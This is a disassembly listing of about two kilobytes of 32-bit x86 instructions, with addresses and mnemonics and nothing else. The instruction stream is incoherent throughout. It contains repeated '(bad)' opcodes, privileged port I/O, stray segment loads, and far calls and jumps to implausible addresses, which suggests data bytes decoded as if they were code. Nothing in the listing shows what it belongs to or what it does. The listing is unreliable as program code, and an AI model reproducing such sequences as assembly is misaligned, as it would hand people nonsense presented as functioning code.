  4156e4:	mov    eax,0x383f7cb0
  4156e9:	cmp    al,BYTE PTR [ebp+0x6b1997f2]
  4156ef:	fs jb  0x415682
  4156f2:	push   0x928a653e
  4156f7:	mov    ss,WORD PTR [ebp-0x13]
  4156fa:	aas    
  4156fb:	out    0xa0,al
  4156fd:	xchg   ebp,eax
  4156fe:	arpl   WORD PTR [esi+0x29],di
  415701:	ss xchg edx,ecx
  415704:	mov    ds:0x43d60924,eax
  415709:	sti    
  41570a:	call   0xd2ed17b2
  41570f:	pop    ecx
  415710:	adc    al,0x9d
  415712:	dec    esi
  415713:	pop    esp
  415714:	pop    ebx
  415715:	shl    ch,0x13
  415718:	jb     0x4156a3
  41571a:	sbb    BYTE PTR ds:0xc936cb64,ah
  415720:	popa   
  415721:	push   0xb827f75e
  415726:	cmp    bl,0x34
  415729:	sahf   
  41572a:	xchg   ebp,eax
  41572b:	shl    DWORD PTR [edi],0x5f
  41572e:	dec    edx
  41572f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415730:	repz leave 
  415732:	jmp    0x415736
  415734:	xor    ch,BYTE PTR [edx]
  415736:	mov    esi,0x8e49e71d
  41573b:	ficomp WORD PTR [ebp+0x2d]
  41573e:	pop    esp
  41573f:	xchg   esp,eax
  415740:	enter  0xb067,0xaa
  415744:	faddp  st(6),st
  415746:	into   
  415747:	jne    0x41578a
  415749:	stos   BYTE PTR es:[edi],al
  41574a:	xchg   esp,eax
  41574b:	test   BYTE PTR [ebx-0x51],cl
  41574e:	push   ss
  41574f:	test   al,ah
  415751:	inc    edi
  415752:	adc    eax,0xd99597ab
  415757:	jo     0x41573a
  415759:	data16 aam 0xf6
  41575c:	(bad)  
  41575d:	mov    bl,0x3a
  41575f:	lods   eax,DWORD PTR ds:[esi]
  415760:	dec    esp
  415761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415762:	or     BYTE PTR [eax+0x2624a995],ch
  415768:	mov    al,ds:0xf9e09ef2
  41576d:	mul    esi
  41576f:	push   0xffffffa8
  415771:	jnp    0x415742
  415773:	mov    cl,0x94
  415775:	fsubr  QWORD PTR [ebp+0x3b]
  415778:	push   ds
  415779:	jae    0x4157e0
  41577b:	loope  0x4157d3
  41577d:	xchg   ebp,eax
  41577e:	scas   eax,DWORD PTR es:[edi]
  41577f:	sbb    eax,0xe1a67f76
  415784:	in     eax,0x7c
  415786:	xchg   esi,eax
  415787:	add    esp,DWORD PTR [ecx]
  415789:	pop    es
  41578a:	sbb    ah,BYTE PTR [edx-0x7a]
  41578d:	jbe    0x415728
  41578f:	sub    DWORD PTR [esi],edi
  415791:	sar    DWORD PTR [edx+0x4d],cl
  415794:	imul   eax,DWORD PTR ds:0x38b83705,0x75
  41579b:	pop    edx
  41579c:	lahf   
  41579d:	popa   
  41579e:	cmp    al,0x48
  4157a0:	outs   dx,BYTE PTR ds:[esi]
  4157a1:	gs push 0x4e
  4157a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157a5:	and    eax,0x3476f718
  4157aa:	dec    edi
  4157ab:	jns    0x415749
  4157ad:	fwait
  4157ae:	stc    
  4157af:	inc    edx
  4157b0:	mov    ds:0xa0cd9390,eax
  4157b5:	pop    ds
  4157b6:	jb     0x4157e7
  4157b8:	in     al,dx
  4157b9:	dec    edi
  4157ba:	shl    DWORD PTR [edx-0x5eb75000],1
  4157c0:	jle    0x4157f3
  4157c2:	jp     0x4157fd
  4157c4:	fcomp  DWORD PTR [esi+eax*4]
  4157c7:	outs   dx,DWORD PTR ds:[esi]
  4157c8:	cmp    al,0x30
  4157ca:	mov    edi,0x8f0f0570
  4157cf:	(bad)
  4157d2:	das    
  4157d3:	sbb    al,0x59
  4157d5:	lock int3 
  4157d7:	stos   DWORD PTR es:[edi],eax
  4157d8:	imul   DWORD PTR [ecx]
  4157da:	out    dx,eax
  4157db:	add    al,0x53
  4157dd:	xchg   edx,eax
  4157de:	xor    eax,0xa831ef98
  4157e3:	scas   al,BYTE PTR es:[edi]
  4157e4:	xchg   esi,eax
  4157e5:	jmp    0xe8d1ff9a
  4157ea:	jmp    0x41579b
  4157ec:	mov    ebp,0xf60292f7
  4157f1:	(bad)  
  4157f2:	dec    esp
  4157f3:	imul   ebx,esp,0x68
  4157f6:	dec    eax
  4157f7:	cwde   
  4157f8:	cmc    
  4157f9:	cmc    
  4157fa:	sar    eax,1
  4157fc:	mov    eax,0xc49698ba
  415801:	fcom   QWORD PTR [edi+ebx*8+0x64]
  415805:	rcr    BYTE PTR [esi-0x41],1
  415808:	pushf  
  415809:	xlat   BYTE PTR ds:[ebx]
  41580a:	dec    edx
  41580b:	in     eax,dx
  41580c:	test   BYTE PTR [eax+0x34],bh
  41580f:	push   ecx
  415810:	out    dx,eax
  415811:	inc    ebp
  415812:	scas   al,BYTE PTR es:[edi]
  415813:	or     BYTE PTR [eax],bl
  415815:	push   0xffffffe6
  415817:	and    DWORD PTR [ebx+0x717c66da],0x5d315fe6
  415821:	dec    ebp
  415822:	aas    
  415823:	gs or  edi,esp
  415826:	add    dh,BYTE PTR [ecx]
  415828:	in     eax,dx
  415829:	lea    eax,[ebp-0x15]
  41582c:	retf   0x8e3e
  41582f:	mov    esi,0x1a35f82f
  415834:	call   0x89f8:0xcf2284bf
  41583b:	es push cs
  41583d:	xlat   BYTE PTR ds:[ebx]
  41583e:	pop    ds
  41583f:	jno    0x415834
  415841:	mov    al,0x19
  415843:	js     0x41580e
  415845:	xchg   ecx,eax
  415846:	scas   al,BYTE PTR es:[edi]
  415847:	loopne 0x4157f7
  415849:	in     eax,dx
  41584a:	jo     0x415871
  41584c:	js     0x4158bf
  41584e:	fldenv [ebx+esi*8+0x5d]
  415852:	out    0x4f,al
  415854:	aas    
  415855:	xor    DWORD PTR [edx-0xb],esi
  415858:	test   eax,0xf875c47
  41585d:	pusha  
  41585e:	ja     0x415876
  415860:	lods   al,BYTE PTR ds:[esi]
  415861:	ja     0x415862
  415863:	jmp    0xe8066d0d
  415868:	push   esp
  415869:	and    BYTE PTR [edi-0x4],0x24
  41586d:	sub    DWORD PTR [edi],esi
  41586f:	xor    bl,BYTE PTR [eax+0x667369a]
  415875:	rol    DWORD PTR [eax],1
  415877:	mov    BYTE PTR [ecx-0x15a7e60b],ch
  41587d:	sub    eax,0xb1201275
  415882:	inc    edx
  415883:	jge    0x41581b
  415885:	sbb    DWORD PTR [ebx-0x43df9beb],0x7eea4abe
  41588f:	mov    al,0x29
  415891:	fwait
  415892:	ins    BYTE PTR es:[edi],dx
  415893:	idiv   DWORD PTR [ebx]
  415895:	push   ebx
  415896:	xchg   esp,eax
  415897:	inc    esi
  415898:	imul   edx,DWORD PTR [edi+esi*1-0x516e8c0d],0xef1a879e
  4158a3:	jo     0x415889
  4158a5:	scas   al,BYTE PTR es:[edi]
  4158a6:	pop    edi
  4158a7:	imul   DWORD PTR [eax-0x4505eb59]
  4158ad:	int3   
  4158ae:	inc    ecx
  4158af:	add    DWORD PTR [ecx+0x5a1a3555],edi
  4158b5:	and    eax,0x62c2ce1a
  4158ba:	jno    0x4158b0
  4158bc:	pop    ebx
  4158bd:	aad    0x66
  4158bf:	adc    al,0x59
  4158c1:	xor    cl,BYTE PTR [ebx+0x19]
  4158c4:	test   DWORD PTR ds:0xd1ac9b65,edx
  4158ca:	xchg   ecx,eax
  4158cb:	sbb    eax,0xd19f1cb9
  4158d0:	add    al,BYTE PTR [ebx]
  4158d2:	imul   ebx
  4158d4:	add    BYTE PTR cs:[eax-0x12],cl
  4158d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158d9:	outs   dx,DWORD PTR ds:[esi]
  4158da:	inc    eax
  4158db:	pushw  ss
  4158dd:	mov    bh,0x72
  4158df:	and    al,0xfe
  4158e1:	sbb    eax,0xad1ea9b9
  4158e6:	and    DWORD PTR [edi-0x6e8b96b2],edi
  4158ec:	test   al,0x28
  4158ee:	xchg   ebx,eax
  4158ef:	mov    edx,edi
  4158f1:	jns    0x415939
  4158f3:	aad    0x83
  4158f5:	cli    
  4158f6:	mov    ds:0xbb034421,eax
  4158fb:	lahf   
  4158fc:	imul   edi,DWORD PTR [esi+esi*8],0x96a41a20
  415903:	retf   0x96b8
  415906:	and    eax,0x74df0e05
  41590b:	pop    ds
  41590c:	mov    esi,0x263d53be
  415911:	or     dh,cl
  415913:	pop    esp
  415914:	mov    cs,WORD PTR [ecx+eiz*1-0x40]
  415918:	adc    ebp,DWORD PTR [ebx+0x1e]
  41591b:	push   ecx
  41591c:	pop    ss
  41591d:	xchg   ecx,eax
  41591e:	cmp    eax,0x39815e62
  415923:	cli    
  415924:	arpl   dx,cx
  415926:	xchg   bl,bh
  415928:	lods   al,BYTE PTR fs:[esi]
  41592a:	jl     0x41590f
  41592c:	icebp  
  41592d:	and    al,ch
  41592f:	dec    esp
  415930:	mov    dh,0x7
  415932:	test   BYTE PTR [eax+0x169ba226],dl
  415938:	(bad)  
  415939:	and    al,0x7b
  41593b:	sahf   
  41593c:	fcmovu st,st(5)
  41593e:	shl    ah,cl
  415940:	cwde   
  415941:	call   0x8b42efa3
  415946:	shl    DWORD PTR [esi],1
  415948:	loop   0x415995
  41594a:	pop    ds
  41594b:	jae    0x415995
  41594d:	out    dx,eax
  41594e:	das    
  41594f:	inc    ebx
  415950:	sbb    al,0xbd
  415952:	push   es
  415953:	fsub   QWORD PTR [esi-0x6]
  415956:	dec    ebp
  415957:	jmp    ebx
  415959:	loopne 0x415942
  41595b:	push   edx
  41595c:	pop    eax
  41595d:	ds pop es
  41595f:	(bad)  
  415960:	retf   0x8211
  415963:	ja     0x415965
  415965:	jmp    0x98f793b3
  41596a:	fist   WORD PTR [ebp-0x61]
  41596d:	mov    ecx,0xff256262
  415972:	xor    BYTE PTR [eax],0x0
  415975:	repnz mov es,WORD PTR [edx-0x2b]
  415979:	sub    BYTE PTR [eax-0x6fcacd15],dl
  41597f:	or     BYTE PTR [ebx+0x1a],0x67
  415983:	push   eax
  415984:	outs   dx,DWORD PTR ds:[esi]
  415985:	aam    0x68
  415987:	cli    
  415988:	mov    ebx,0xd7a16c08
  41598d:	adc    eax,0xc334fa5
  415992:	mov    ebp,0x2b40b0bc
  415997:	or     al,BYTE PTR [esi]
  415999:	xor    eax,ebp
  41599b:	jp     0x415a07
  41599d:	stos   DWORD PTR es:[edi],eax
  41599e:	fst    DWORD PTR [ebp-0x72a40429]
  4159a4:	dec    BYTE PTR [esi]
  4159a6:	call   0x3f24ae9f
  4159ab:	cdq    
  4159ac:	(bad)  
  4159ad:	inc    ebx
  4159ae:	jae    0x415a1f
  4159b0:	xor    ebp,DWORD PTR [ecx+0x7d]
  4159b3:	int3   
  4159b4:	pop    eax
  4159b5:	pop    ebx
  4159b6:	fdivp  st(6),st
  4159b8:	jmp    0xcf096915
  4159bd:	call   0x4c70:0x29d3e965
  4159c4:	sub    BYTE PTR [ebp*4+0x5451fbd],0x22
  4159cc:	jne    0x415a11
  4159ce:	nop
  4159cf:	push   0x9ebd8c99
  4159d4:	dec    ebx
  4159d5:	xor    eax,0xef9233d9
  4159da:	sbb    DWORD PTR [eax*2-0xb1184aa],esp
  4159e1:	nop
  4159e2:	or     eax,0x10f8524
  4159e7:	test   BYTE PTR [ebx+edi*8-0x3071179c],cl
  4159ee:	arpl   WORD PTR [esi+eiz*8],sp
  4159f1:	or     esi,ebp
  4159f3:	jo     0x4159b1
  4159f5:	icebp  
  4159f6:	pop    ecx
  4159f7:	cmp    eax,0xc4479cc4
  4159fc:	stos   DWORD PTR es:[edi],eax
  4159fd:	outs   dx,DWORD PTR ds:[esi]
  4159fe:	dec    edx
  4159ff:	or     DWORD PTR [eax],0x6f
  415a02:	adc    esi,DWORD PTR [edx]
  415a04:	inc    edx
  415a05:	pop    ebx
  415a06:	cmp    eax,0x6673121b
  415a0b:	(bad)  
  415a0c:	aad    0x92
  415a0e:	mov    bl,0x7b
  415a10:	and    DWORD PTR [ecx],ebp
  415a12:	icebp  
  415a13:	popa   
  415a14:	test   eax,0x4783b050
  415a19:	or     BYTE PTR [esp+ecx*8],ah
  415a1c:	fst    QWORD PTR ds:0xd036edb7
  415a22:	pop    ebp
  415a23:	in     eax,0x43
  415a25:	je     0x415a65
  415a27:	xchg   edi,eax
  415a28:	sbb    ah,BYTE PTR [ebp+ebx*1-0x7b]
  415a2c:	dec    esi
  415a2d:	jno    0x415a41
  415a2f:	rol    ebp,0x46
  415a32:	mov    bl,0x71
  415a34:	mov    ecx,0xb740202c
  415a39:	xchg   ebp,eax
  415a3a:	and    edi,DWORD PTR [eax+0x6baffc49]
  415a40:	repnz int3 
  415a42:	mov    bh,0x79
  415a44:	sub    BYTE PTR [ebx+0x28],dh
  415a47:	outs   dx,DWORD PTR ds:[esi]
  415a48:	jmp    0x415a53
  415a4a:	loope  0x415ab6
  415a4c:	cli    
  415a4d:	sbb    ebx,eax
  415a4f:	(bad)  
  415a50:	jae    0x415abf
  415a52:	stos   BYTE PTR es:[edi],al
  415a53:	div    DWORD PTR ds:0xf5c0e4d5
  415a59:	cmp    bl,bl
  415a5b:	pop    eax
  415a5c:	jbe    0x415a8d
  415a5e:	std    
  415a5f:	mov    eax,0xb282b9e5
  415a64:	in     eax,0x6a
  415a66:	adc    DWORD PTR [edi],eax
  415a68:	mov    eax,ds:0xce178562
  415a6d:	dec    ebp
  415a6e:	sahf   
  415a6f:	xor    cl,BYTE PTR [ebx]
  415a71:	push   0x35bc8a19
  415a76:	adc    ah,BYTE PTR [eax+0x211f7b86]
  415a7c:	(bad)  
  415a7d:	lahf   
  415a7e:	test   al,0x63
  415a80:	loop   0x415ab2
  415a82:	stc    
  415a83:	stos   DWORD PTR es:[edi],eax
  415a84:	pop    esi
  415a85:	rcr    BYTE PTR [esi+ecx*1],0xc5
  415a89:	lods   eax,DWORD PTR ds:[esi]
  415a8a:	call   FWORD PTR [edi-0xf93bdae]
  415a90:	stos   DWORD PTR es:[edi],eax
  415a91:	push   esi
  415a92:	(bad)  
  415a93:	cmp    al,0x7c
  415a95:	sbb    al,al
  415a97:	or     ah,bh
  415a99:	push   0x29f08b68
  415a9e:	or     DWORD PTR [edx-0x4f],edi
  415aa1:	scas   eax,DWORD PTR es:[edi]
  415aa2:	add    BYTE PTR [edx],cl
  415aa4:	loope  0x415a96
  415aa6:	cmp    eax,0xfab5354e
  415aab:	add    ch,BYTE PTR [eax+0x62]
  415aae:	cmp    eax,0x646b6c5b
  415ab3:	jo     0x415ac8
  415ab5:	imul   ebp,DWORD PTR [ecx],0x4cafd3d0
  415abb:	xor    ecx,DWORD PTR [ebx]
  415abd:	fisttp DWORD PTR [edi+0x59]
  415ac0:	dec    eax
  415ac1:	and    DWORD PTR [esi+eax*2-0x7f606eaa],ebx
  415ac8:	jl     0x415aeb
  415aca:	inc    esp
  415acb:	xor    BYTE PTR [ebp+ecx*2+0x71ef291d],al
  415ad2:	mov    cl,0xc3
  415ad4:	pop    eax
  415ad5:	stos   BYTE PTR es:[edi],al
  415ad6:	jecxz  0x415b05
  415ad8:	lods   al,BYTE PTR ds:[esi]
  415ad9:	imul   eax,DWORD PTR [ecx+eax*2-0x62],0x6d15cb5e
  415ae1:	or     DWORD PTR [ecx-0x3f],0x38
  415ae5:	and    esi,0xfffffffb
  415ae8:	mov    ch,0x5
  415aea:	add    al,0xcf
  415aec:	fst    DWORD PTR [ecx-0x34eaa1a2]
  415af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415af3:	fcom   DWORD PTR [ecx+0x69449454]
  415af9:	inc    ecx
  415afa:	mov    al,ds:0xf1fc4d89
  415aff:	rcl    BYTE PTR [ebx+0x60],1
  415b02:	mov    ecx,DWORD PTR [edx]
  415b04:	inc    ecx
  415b05:	adc    DWORD PTR [eax-0x25],0x95143d45
  415b0c:	jmp    0x415b01
  415b0e:	and    al,0xad
  415b10:	and    al,bh
  415b12:	mov    BYTE PTR [ebx+eax*2+0x13074e76],bl
  415b19:	in     eax,dx
  415b1a:	xchg   bh,al
  415b1c:	adc    ebx,DWORD PTR [esi+0x23]
  415b1f:	xchg   esi,eax
  415b20:	imul   BYTE PTR [ebx+0x13f592e9]
  415b26:	sub    BYTE PTR [edx+0x72],bh
  415b29:	pop    edx
  415b2a:	call   0xa187:0x90919b3
  415b31:	data16 mov bh,0xe5
  415b34:	push   ecx
  415b35:	pop    es
  415b36:	sub    DWORD PTR [edi-0x2c],esp
  415b39:	xor    bh,bl
  415b3b:	adc    ah,BYTE PTR [ecx-0x79e7a3f9]
  415b41:	sub    DWORD PTR [eax-0x2e10d6c0],esp
  415b47:	xchg   ecx,eax
  415b48:	mov    al,ds:0x37e53581
  415b4d:	std    
  415b4e:	xor    DWORD PTR [eax-0x44],edi
  415b51:	sub    ebx,DWORD PTR [esi]
  415b53:	mov    al,ds:0x9cb7f429
  415b58:	and    DWORD PTR [edx+0x27c78d01],0x7366303d
  415b62:	add    eax,0x4247f579
  415b67:	es (bad) 
  415b69:	mov    ebp,0x33bc6450
  415b6e:	mov    ebp,0x453e164e
  415b73:	sub    esi,DWORD PTR ds:0xba3570eb
  415b79:	fisttp QWORD PTR [eax+0x192e3397]
  415b7f:	mov    ch,0x6d
  415b81:	adc    al,al
  415b83:	mov    BYTE PTR [esi+0x579d8ef5],cl
  415b89:	adc    eax,0xffffffc3
  415b8c:	inc    ebx
  415b8d:	or     edi,esi
  415b8f:	sub    dh,BYTE PTR [ecx]
  415b91:	xchg   dh,bl
  415b93:	(bad)  
  415b95:	test   DWORD PTR [ecx+edx*1+0x4d],ebx
  415b99:	mov    BYTE PTR [esp+ecx*8],cl
  415b9c:	ror    BYTE PTR [edx],1
  415b9e:	repnz xlat BYTE PTR ds:[ebx]
  415ba0:	xlat   BYTE PTR ds:[ebx]
  415ba1:	mov    ah,0xca
  415ba3:	push   edi
  415ba4:	rol    BYTE PTR [ebx-0x70],cl
  415ba7:	sbb    al,al
  415ba9:	nop
  415baa:	test   al,0x69
  415bac:	test   eax,0x7f828421
  415bb1:	lods   al,BYTE PTR ds:[esi]
  415bb2:	adc    BYTE PTR [ebx],ch
  415bb4:	jmp    0x8f833820
  415bb9:	ins    DWORD PTR es:[edi],dx
  415bba:	retf   0x3560
  415bbd:	xchg   edi,eax
  415bbe:	les    ecx,FWORD PTR [edi+0x59]
  415bc1:	out    0xf8,al
  415bc3:	fnstcw WORD PTR [ebx+ecx*1]
  415bc6:	pusha  
  415bc7:	imul   ebx,DWORD PTR [ebx+0x1c647221],0x51c7dbca
  415bd1:	in     eax,dx
  415bd2:	or     al,0x1f
  415bd4:	push   esp
  415bd5:	pop    es
  415bd6:	pop    eax
  415bd7:	loope  0x415bc4
  415bd9:	dec    ecx
  415bda:	scas   al,BYTE PTR es:[edi]
  415bdb:	dec    esi
  415bdc:	into   
  415bdd:	inc    ecx
  415bde:	addr16 sbb bl,cl
  415be1:	cmp    edi,DWORD PTR [ecx+0x361567b3]
  415be7:	rcl    BYTE PTR [ecx+edi*8],cl
  415bea:	icebp  
  415beb:	dec    eax
  415bec:	xchg   esi,eax
  415bed:	push   ebx
  415bee:	in     al,0xec
  415bf0:	push   0x6346cd7c
  415bf5:	mov    ah,al
  415bf7:	xchg   ecx,eax
  415bf8:	in     eax,dx
  415bf9:	adc    BYTE PTR ds:0xed668e42,al
  415bff:	sbb    BYTE PTR [ecx+0x17],ah
  415c02:	xor    eax,ebp
  415c04:	and    dl,BYTE PTR [edx+ebp*8+0x4c]
  415c08:	pop    edx
  415c09:	mov    esp,0x8245948b
  415c0e:	pop    ds
  415c0f:	adc    dl,BYTE PTR [ecx]
  415c11:	shl    DWORD PTR [ebx-0x6783fb7],0x53
  415c18:	sbb    al,0x32
  415c1a:	mov    ebp,0x697dd5b8
  415c1f:	sub    DWORD PTR [esi],0x32e38719
  415c25:	call   0x3a7666e8
  415c2a:	scas   eax,DWORD PTR es:[edi]
  415c2b:	fwait
  415c2c:	jmp    0x15a716ae
  415c31:	scas   eax,DWORD PTR es:[edi]
  415c32:	enter  0xcd04,0xce
  415c36:	cmp    al,0x14
  415c39:	mov    ah,0xf7
  415c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c3c:	les    ebp,FWORD PTR [esi-0x6ffd3623]
  415c42:	pushf  
  415c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c44:	push   0xfffffffe
  415c46:	jo     0x415bdd
  415c48:	aam    0xe
  415c4a:	xlat   BYTE PTR ds:[ebx]
  415c4b:	inc    edx
  415c4c:	lods   al,BYTE PTR ds:[esi]
  415c4d:	pop    ds
  415c4e:	or     ebx,edi
  415c50:	call   DWORD PTR [ebp+0x41]
  415c53:	dec    ebp
  415c54:	rcl    BYTE PTR [esi-0x1d],cl
  415c57:	xchg   edi,eax
  415c58:	sbb    dl,dl
  415c5a:	arpl   ax,si
  415c5c:	call   0xe688:0x5ee28b38
  415c63:	cmp    ecx,edx
  415c65:	jnp    0x415c67
  415c67:	ds cmp eax,0xe7c2d804
  415c6d:	and    ebx,ebp
  415c6f:	mov    ebp,0x257a64c7
  415c74:	mov    bh,0x7b
  415c76:	jmp    0xeecc:0x21e54e89
  415c7d:	xor    al,0xa9
  415c7f:	sub    ebp,DWORD PTR ds:0x307746e5
  415c85:	mov    esi,0x2b8fdb73
  415c8a:	inc    ebx
  415c8b:	mov    bl,0x16
  415c8d:	stos   DWORD PTR es:[edi],eax
  415c8e:	xchg   ebp,eax
  415c8f:	jg     0x415cc2
  415c91:	push   0xd8d9b1ef
  415c96:	fisttp QWORD PTR [ebp+0x2c46a245]
  415c9c:	and    edi,DWORD PTR [eax-0x5a]
  415c9f:	ja     0x415c59
  415ca1:	mov    eax,0x19e8b7ce
  415ca6:	ins    DWORD PTR es:[edi],dx
  415ca7:	cli    
  415ca8:	dec    BYTE PTR [ebx+0x681eb330]
  415cae:	std    
  415caf:	ret    0x523d
  415cb2:	jo     0x415cd0
  415cb4:	fnstcw WORD PTR [ebx]
  415cb6:	test   al,0x15
  415cb8:	inc    edx
  415cb9:	rcl    ebx,1
  415cbb:	push   edx
  415cbc:	push   ecx
  415cbd:	jno    0x415cfa
  415cbf:	rcl    DWORD PTR [ebx+0x28],0x5
  415cc3:	loopne 0x415d10
  415cc5:	shl    DWORD PTR [edi+0x2b],1
  415cc8:	cmp    ebp,DWORD PTR [esi-0x5e]
  415ccb:	lahf   
  415ccc:	xchg   edx,eax
  415ccd:	pcmpeqw mm4,mm2
  415cd0:	jno    0x415c65
  415cd2:	aam    0x5f
  415cd4:	hlt    
  415cd5:	pop    ecx
  415cd6:	mov    esi,0x33b2f81e
  415cdb:	jecxz  0x415cd6
  415cdd:	or     al,0x45
  415cdf:	mov    esp,0x9966f769
  415ce4:	jge    0x415c8e
  415ce6:	fwait
  415ce7:	ins    BYTE PTR es:[edi],dx
  415ce8:	fs add eax,0xe03fe99d
  415cee:	push   ebp
  415cef:	enter  0xa8d8,0xf3
  415cf3:	leave  
  415cf4:	mov    BYTE PTR [ebp-0x71625f73],cl
  415cfa:	iret   
  415cfb:	xor    eax,0xb107001a
  415d00:	call   DWORD PTR [esp+ecx*2-0x5c]
  415d04:	fimul  DWORD PTR [ebx+0x23]
  415d07:	jno    0x415c8d
  415d09:	jle    0x415ca5
  415d0b:	les    ebp,FWORD PTR [ebx+0xc]
  415d0e:	or     esi,DWORD PTR [edx+0x6034e3e3]
  415d14:	outs   dx,DWORD PTR ds:[esi]
  415d15:	leave  
  415d16:	sbb    dh,bl
  415d18:	das    
  415d19:	mov    ah,0xe6
  415d1b:	xlat   BYTE PTR ds:[ebx]
  415d1c:	test   BYTE PTR [edx-0x36861d5b],dl
  415d22:	cmp    eax,0xc5fbb568
  415d27:	js     0x415d99
  415d29:	push   ebx
  415d2a:	cmp    esi,esi
  415d2c:	jnp    0x415d74
  415d2e:	or     dh,BYTE PTR [edx]
  415d30:	aas    
  415d31:	clc    
  415d32:	xchg   DWORD PTR [ebx],eax
  415d34:	xor    eax,0x1f8b4d4b
  415d39:	push   ebp
  415d3a:	mov    eax,ds:0xc9439954
  415d3f:	xchg   esi,eax
  415d40:	pop    es
  415d41:	pop    esp
  415d42:	pop    ss
  415d43:	inc    eax
  415d44:	adc    eax,0x157aa8a3
  415d49:	or     eax,0xd355030e
  415d4e:	inc    esp
  415d4f:	fidivr WORD PTR [ebp-0x63]
  415d52:	hlt    
  415d53:	and    ecx,DWORD PTR [ecx]
  415d55:	fsub   DWORD PTR [edx]
  415d57:	or     eax,DWORD PTR [ecx-0x6006280c]
  415d5d:	inc    edx
  415d5e:	int    0xf7
  415d60:	cdq    
  415d61:	jbe    0x415d98
  415d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d64:	scas   al,BYTE PTR es:[edi]
  415d65:	loop   0x415cef
  415d67:	cmpxchg DWORD PTR [edi],ebp
  415d6a:	sub    eax,0x1ed43ac8
  415d6f:	cmp    al,0xd7
  415d71:	inc    esp
  415d72:	jbe    0x415d8d
  415d74:	sub    BYTE PTR [edi-0x46],bh
  415d77:	into   
  415d78:	adc    DWORD PTR [ebp-0x26],edx
  415d7b:	inc    esi
  415d7c:	retf   
  415d7d:	sbb    BYTE PTR [ebx-0x226f7e0b],0xf1
  415d84:	xchg   ebp,eax
  415d85:	jmp    0xbca742ac
  415d8a:	xchg   esi,eax
  415d8b:	mov    gs,WORD PTR [ecx+eax*1-0x10]
  415d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d90:	adc    edi,eax
  415d92:	inc    eax
  415d93:	or     al,0xca
  415d95:	and    ebp,esp
  415d97:	pushf  
  415d98:	popf   
  415d99:	and    ebp,DWORD PTR [ebp-0x3e5165cd]
  415d9f:	mov    al,ds:0xfbcba1b8
  415da4:	push   edx
  415da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415da6:	popf   
  415da7:	or     cl,BYTE PTR [edx]
  415da9:	les    edx,FWORD PTR [eax]
  415dab:	jno    0x415d56
  415dad:	push   ecx
  415dae:	or     ebx,DWORD PTR [esi-0x7e]
  415db1:	mov    esp,0xd6fa3c5e
  415db6:	push   edx
  415db7:	pushf  
  415db8:	repnz lds edi,FWORD PTR [ebx]
  415dbb:	cmp    al,BYTE PTR [ebp+eax*1+0x716b1948]
  415dc2:	xchg   ebp,eax
  415dc3:	out    0x19,al
  415dc5:	dec    esi
  415dc6:	mov    DWORD PTR [eax],esp
  415dc8:	out    dx,al
  415dc9:	aam    0x25
  415dcb:	push   cs
  415dcc:	push   eax
  415dcd:	test   al,0x4
  415dd0:	inc    edi
  415dd1:	stos   BYTE PTR es:[edi],al
  415dd2:	ss call 0x5e7e:0xd2dfc739
  415dda:	pop    eax
  415ddb:	or     eax,0x103ee7f7
  415de0:	call   0x9fcc:0x6eef5576
  415de7:	retf   0xc75d
  415dea:	dec    edx
  415deb:	ss mov ebx,0x1073a7c6
  415df1:	add    BYTE PTR [esi],ah
  415df3:	mov    WORD PTR [ecx-0x2be99948],ss
  415df9:	and    edi,DWORD PTR [esi]
  415dfb:	pcmpeqd mm1,QWORD PTR [esi]
  415dfe:	pusha  
  415dff:	xchg   ebx,eax
  415e00:	and    ah,0x55
  415e03:	dec    ecx
  415e04:	test   BYTE PTR [eax+0x55],al
  415e07:	adc    BYTE PTR [edi],bl
  415e09:	sbb    ah,BYTE PTR [esi-0x1a7aca50]
  415e0f:	cmp    DWORD PTR [edx-0x7138e656],edx
  415e15:	addr16 pop ds
  415e17:	add    DWORD PTR [ebp+0x9b5919b],ecx
  415e1d:	sub    cl,BYTE PTR [eax]
  415e1f:	sub    eax,0xc8ed7e4a
  415e24:	lods   al,BYTE PTR ds:[esi]
  415e25:	dec    edx
  415e26:	in     al,dx
  415e27:	(bad)
  415e2a:	mov    BYTE PTR ds:0x7f9bfeae,bl
  415e30:	not    DWORD PTR ds:0xc57e9c73
  415e36:	lea    ecx,[eax+0x2e]
  415e39:	das    
  415e3a:	retf   
  415e3b:	fmul   DWORD PTR [eax]
  415e3d:	loopne 0x415e47
  415e3f:	sub    DWORD PTR [esi+edx*4+0x47bcdf02],esp
  415e46:	push   0xffffffcf
  415e48:	pop    ss
  415e49:	mov    al,0x22
  415e4b:	and    eax,0x7dcb8321
  415e50:	fsub   QWORD PTR [edx]
  415e52:	push   esi
  415e53:	scas   al,BYTE PTR es:[edi]
  415e54:	pusha  
  415e55:	fdivrp st(5),st
  415e57:	in     ax,0xd2
  415e5a:	jp     0x415ddf
  415e5c:	popa   
  415e5d:	cmp    ecx,DWORD PTR [edi]
  415e5f:	loopne 0x415e1e
  415e61:	sub    ebx,ebx
  415e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e64:	push   ebx
  415e65:	dec    edi
  415e66:	test   al,0x8e
  415e68:	std    
  415e69:	out    dx,al
  415e6a:	add    al,0xb8
  415e6c:	mov    esp,0x7e4547ef
  415e71:	inc    esp
  415e72:	cmp    eax,0x857f3d09
  415e77:	sbb    BYTE PTR [esp+edx*1],dh
  415e7a:	xchg   ah,dl
  415e7c:	jecxz  0x415eb8
  415e7e:	cmp    al,0x5f
  415e80:	out    0xce,eax
  415e82:	mov    eax,ds:0x8e2d3909
  415e87:	aam    0x8f
  415e89:	adc    BYTE PTR [edi+ecx*1-0xd],ch
  415e8d:	les    eax,FWORD PTR [ebx-0x74f8c267]
  415e93:	mov    bl,0x1
  415e95:	jbe    0x415ea5
  415e97:	sub    al,dh
  415e99:	cmp    DWORD PTR [ebp+0x48],esp
  415e9c:	xchg   esp,eax
  415e9d:	xor    DWORD PTR [ebp+0x6b],ebp
  415ea0:	cdq    
  415ea1:	inc    ebx
  415ea2:	cmp    al,0xc7
